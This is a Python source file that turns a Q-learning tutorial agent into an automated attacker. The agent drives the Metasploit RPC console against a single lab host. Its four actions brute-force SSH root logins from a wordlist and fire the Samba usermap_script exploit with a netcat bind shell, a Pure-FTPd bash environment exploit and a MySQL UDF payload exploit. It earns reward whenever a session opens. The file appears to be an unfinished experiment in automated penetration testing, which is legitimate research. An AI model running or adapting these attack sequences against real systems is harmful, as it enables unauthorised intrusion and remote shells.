# coding=utf-8
"""
This part of code is the Q learning brain, which is a brain of the agent.
All decisions are made in here.

View more on my tutorial page: https://morvanzhou.github.io/tutorials/
"""

import numpy as np
import pandas as pd
import time
from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole


class QLearningTable:
    def __init__(self, actions, learning_rate=0.01, reward_decay=0.9, e_greedy=0.9):
        self.actions = actions  # a list
        self.lr = learning_rate
        self.gamma = reward_decay
        self.epsilon = e_greedy
        self.q_table = pd.DataFrame(columns=self.actions, dtype=np.float64)
        
        self.client = MsfRpcClient('password')
        self.console = MsfRpcConsole(self.client, cb=self.read_console)
        
        self.global_positive_out = list()
        self.global_console_status = False
        self.success=False
        
    def read_console(self, console_data):
        self.global_console_status = console_data['busy']
        #print global_console_status
        if '[+]' in console_data['data']:
        	sigdata = console_data['data'].rstrip().split('\n')
        	for line in sigdata:
        	    if '[+]' in line:
                		self.global_positive_out.append(line)
        if ("Success" in console_data['data']) or ("opened" in console_data['data']):
            self.success= True
            #print('success='+ str(success))
        else:
            self.success= False
        print console_data['data']

    def choose_action(self, observation):
        self.check_state_exist(observation)
        # action selection
        if np.random.uniform() < self.epsilon:
            # choose best action
            state_action = self.q_table.loc[observation, :]
            # some actions may have the same value, randomly choose on in these actions
            action = np.random.choice(state_action[state_action == np.max(state_action)].index)
        else:
            # choose random action
            action = np.random.choice(self.actions)
        return action

    def learn(self, s, a, r, s_):
        self.check_state_exist(s_)
        q_predict = self.q_table.loc[s, a]
        if s_ != 'terminal':
            q_target = r + self.gamma * self.q_table.loc[s_, :].max()  # next state is not terminal
        else:
            q_target = r  # next state is terminal
        self.q_table.loc[s, a] += self.lr * (q_target - q_predict)  # update

    def check_state_exist(self, state):
        if state not in self.q_table.index:
            # append new state to q table
            self.q_table = self.q_table.append(
                pd.Series(
                    [0]*len(self.actions),
                    index=self.q_table.columns,
                    name=state,
                )
            )
                
    def nmap(self):
        # à modifier
        return str({'port21':True, 'port22':True, 'port139':True, 'port3306':True}) 
    
    def step(self, action):
        s_ = 'terminal'  # next state, à modifier
        #success2= action() # à vérifier

        if action == 0:   #  ssh
            success2= self.ssh_login()
            print('ssh')
        elif action == 1:   # samba
            success2= self.samba()
            print('samba')
        elif action == 2:   # ftp
            success2= self.ftp1()
            print('ftp')
        elif action == 3:   # mysql
            success2= self.mysql()
            print('mysql')

        #time.sleep(20) # modifier, pas bon de faire comme ça
        
        # reward function
        #if s_ == self.canvas.coords(self.oval):
        if success2:
            reward = 1
            done = True
            s_ = 'terminal'
            print('success2='+str(success2))
        else:
            reward = -1
            done = True
            s_ = 'terminal'
            print('success2='+str(success2))
#        else:
#            reward = 0
#            done = False

        return s_, reward, done
    
    
    
    # ACTIONS OF THE REINFORCEMENT LEARNING MODEL
    def ssh_login(self):
        self.console.execute('use auxiliary/scanner/ssh/ssh_login')
        self.console.execute('set RHOSTS 192.168.56.101')
        self.console.execute('set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt')
        self.console.execute('set STOP_ON_SUCCESS true')
        self.console.execute('run')
        time.sleep(5)
        
        while self.global_console_status:
        #while console.console.read()['busy']:
            time.sleep(2)
            
        time.sleep(20)
        
        return self.success
            
    def samba(self):
        self.console.execute('use exploit/multi/samba/usermap_script')
        self.console.execute('set RHOST 192.168.56.101')
        self.console.execute('set payload cmd/unix/bind_netcat')
        self.console.execute('exploit')
        time.sleep(5)
        a= self.success
        self.console.execute('background')
        time.sleep(2) #sans le sleep il y a des problemes d'ordre d'execution
        self.console.execute('y')
        
        time.sleep(20)
        
        return a
        
    def ftp1(self):
        self.console.execute('use exploit/multi/ftp/pureftpd_bash_env_exec')
        self.console.execute('set RHOST 192.168.56.101')
        self.console.execute('exploit')
        
        time.sleep(20)
            
        return self.success
        
    def mysql(self):
        self.console.execute('use exploit/multi/mysql/mysql_udf_payload')
        self.console.execute('set RHOST 192.168.56.101')
        self.console.execute('exploit')
      
        time.sleep(20)
            
        return self.success
            